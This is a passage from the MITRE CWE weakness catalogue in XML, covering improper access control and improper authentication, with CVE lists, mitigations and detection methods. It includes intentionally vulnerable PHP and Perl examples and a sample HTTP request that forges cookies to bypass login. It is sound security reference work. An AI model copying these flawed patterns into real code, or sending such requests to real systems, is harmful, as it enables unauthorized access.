         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-95">
               <Intro_Text>This function runs an arbitrary SQL query on a given database, returning the result of the query.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function runEmployeeQuery($dbName, $name){<xhtml:div style="margin-left:1em;">mysql_select_db($dbName,$globalDbHandle) or die("Could not open Database".$dbName);<xhtml:br/>
                        <xhtml:i>//Use a prepared statement to avoid CWE-89</xhtml:i>
                        <xhtml:br/>$preparedStatement = $globalDbHandle-&gt;prepare('SELECT * FROM employees WHERE name = :name');<xhtml:br/>$preparedStatement-&gt;execute(array(':name' =&gt; $name));<xhtml:br/>return $preparedStatement-&gt;fetchAll();</xhtml:div>}<xhtml:br/>
                     <xhtml:i>/.../</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);</xhtml:div>
               </Example_Code>
               <Body_Text>While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-96">
               <Intro_Text>The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>sub DisplayPrivateMessage {<xhtml:div style="margin-left:1em;">my($id) = @_;<xhtml:br/>my $Message = LookupMessageObject($id);<xhtml:br/>print "From: " . encodeHTML($Message-&gt;{from}) . "&lt;br&gt;\n";<xhtml:br/>print "Subject: " . encodeHTML($Message-&gt;{subject}) . "\n";<xhtml:br/>print "&lt;hr&gt;\n";<xhtml:br/>print "Body: " . encodeHTML($Message-&gt;{body}) . "\n";</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>my $q = new CGI;<xhtml:br/>
                     <xhtml:i># For purposes of this example, assume that CWE-309 and</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># CWE-523 do not apply.</xhtml:i>
                     <xhtml:br/>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:1em;">ExitError("invalid username or password");</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>my $id = $q-&gt;param('id');<xhtml:br/>DisplayPrivateMessage($id);</xhtml:div>
               </Example_Code>
               <Body_Text>While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.</Body_Text>
               <Body_Text>One way to avoid this problem would be to ensure that the "to" field in the message object matches the username of the authenticated user.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-24730</Reference>
               <Description>Go-based continuous deployment product does not check that a user has certain privileges to update or create an app, allowing adversaries to read sensitive repository information</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-24730</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3168</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to reset administrative passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2960</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to modify passwords of other users.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2960</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3597</Reference>
               <Description>Web application stores database file under the web root with insufficient access control (CWE-219), allowing direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3597</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2282</Reference>
               <Description>Terminal server does not check authorization for guest access.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2282</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3230</Reference>
               <Description>Database server does not use appropriate privileges for certain sensitive operations.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3230</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>Gateway uses default "Allow" configuration for its authorization settings.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0034</Reference>
               <Description>Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6123</Reference>
               <Description>Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6123</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5027</Reference>
               <Description>System monitoring software allows users to bypass authorization by creating custom forms.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5027</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-7109</Reference>
               <Description>Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-7109</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3424</Reference>
               <Description>Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3424</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3781</Reference>
               <Description>Content management system does not check access permissions for private files, allowing others to view those files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3781</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4577</Reference>
               <Description>ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4577</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6548</Reference>
               <Description>Product does not check the ACL of a page accessed using an "include" directive, allowing attackers to read unauthorized files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6548</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2925</Reference>
               <Description>Default ACL list for a DNS server does not set certain ACLs, allowing unauthorized DNS queries.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-2925</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6679</Reference>
               <Description>Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6679</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3623</Reference>
               <Description>OS kernel does not check for a certain privilege before setting ACLs for files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3623</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2801</Reference>
               <Description>Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2801</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1155</Reference>
               <Description>Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1155</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Missing Access Control</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Failure to Restrict URL Access</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Broken Access Control</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP35</Entry_ID>
               <Entry_Name>Insecure resource access</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="1"/>
            <Related_Attack_Pattern CAPEC_ID="104"/>
            <Related_Attack_Pattern CAPEC_ID="127"/>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="17"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
            <Related_Attack_Pattern CAPEC_ID="402"/>
            <Related_Attack_Pattern CAPEC_ID="45"/>
            <Related_Attack_Pattern CAPEC_ID="5"/>
            <Related_Attack_Pattern CAPEC_ID="51"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="647"/>
            <Related_Attack_Pattern CAPEC_ID="668"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="77"/>
            <Related_Attack_Pattern CAPEC_ID="87"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-229"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authorization&#34; Page 114; Chapter 6, &#34;Determining&#xA;                  Appropriate Access Control&#34; Page 171"/>
            <Reference External_Reference_ID="REF-231"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-233"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authorization&#34;, Page 39"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 11, &#34;ACL Inheritance&#34;, Page 649"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Likelihood_of_Exploit, Name, Other_Notes, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Modes_of_Introduction, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-24</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Changed name and description; clarified difference between "access control" and "authorization."</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Background_Details, Demonstrative_Examples, Description, Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Alternate_Terms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-01-12">Missing or Inconsistent Access Control</Previous_Entry_Name>
            <Previous_Entry_Name Date="2011-03-29">Improper Access Control (Authorization)</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="287" Name="Improper Authentication" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
			<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>authentification</Term>
               <Description>An alternate term is "authentification", which appears to be most commonly used by people from non-English-speaking countries.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>AuthN</Term>
               <Description>"AuthN" is typically used as an abbreviation of "authentication" within the web application security community. It is also distinct from "AuthZ," which is an abbreviation of "authorization." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>AuthC</Term>
               <Description>"AuthC" is used as an abbreviation of "authentication," but it appears to used less frequently than "AuthN."</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting certain types of authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use an authentication framework or library such as the OWASP ESAPI Authentication feature.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code intends to ensure that the user is already logged in. If not, the code performs authentication with the user-provided username and password. If successful, it sets the loggedin and user cookies to "remember" that the user has already logged in. Finally, the code performs administrator tasks if the logged-in user has the "Administrator" username, as recorded in the user cookie.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>my $q = new CGI;<xhtml:br/>
                     <xhtml:br/>if ($q-&gt;cookie('loggedin') ne "true") {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:1em;">ExitError("Error: you need to log in first");</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">
                              <xhtml:div># Set loggedin and user cookies.<xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:1em;">-name =&gt; 'loggedin',<xhtml:br/>-value =&gt; 'true'<xhtml:br/>);</xhtml:div>
                                 <xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:1em;">-name =&gt; 'user',<xhtml:br/>-value =&gt; $q-&gt;param('username')<xhtml:br/>);</xhtml:div>
                              </xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>if ($q-&gt;cookie('user') eq "Administrator") {<xhtml:div style="margin-left:1em;">DoAdministratorTasks();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Unfortunately, this code can be bypassed. The attacker can set the cookies independently so that the code does not check the username and password. The attacker could do this with an HTTP request containing headers such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>GET /cgi-bin/vulnerable.cgi HTTP/1.1<xhtml:br/>Cookie: user=Administrator<xhtml:br/>Cookie: loggedin=true<xhtml:br/>
                     <xhtml:br/>[body of request]</xhtml:div>
               </Example_Code>
               <Body_Text>By setting the loggedin cookie to "true", the attacker bypasses the entire authentication check. By using the "Administrator" value in the user cookie, the attacker also gains privileges to administer the software.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-117">
               <Intro_Text>In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts [REF-236]. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.</Intro_Text>
               <References>
                  <Reference External_Reference_ID="REF-236"/>
               </References>
            </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors did not use any authentication or used client-side authentication for critical functionality in their OT products.</Body_Text>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-36436</Reference>
               <Description>Python-based authentication proxy does not enforce password authentication during the initial handshake, allowing the client to bypass authentication by specifying a 'None' authentication type.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-36436</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30034</Reference>
